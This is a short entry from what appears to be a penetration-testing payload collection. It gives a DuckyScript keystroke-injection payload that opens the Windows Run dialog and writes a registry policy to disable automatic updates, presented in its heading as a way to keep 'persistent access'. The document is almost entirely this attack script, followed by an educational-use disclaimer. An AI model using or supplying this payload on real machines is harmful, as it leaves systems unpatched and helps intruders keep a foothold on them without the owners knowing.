# Disabling Windows Updates for Persistent Access

Disables Windows updates by modifying the registry, preventing automatic updates and patching.

```
DELAY 500
GUI r
DELAY 200
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.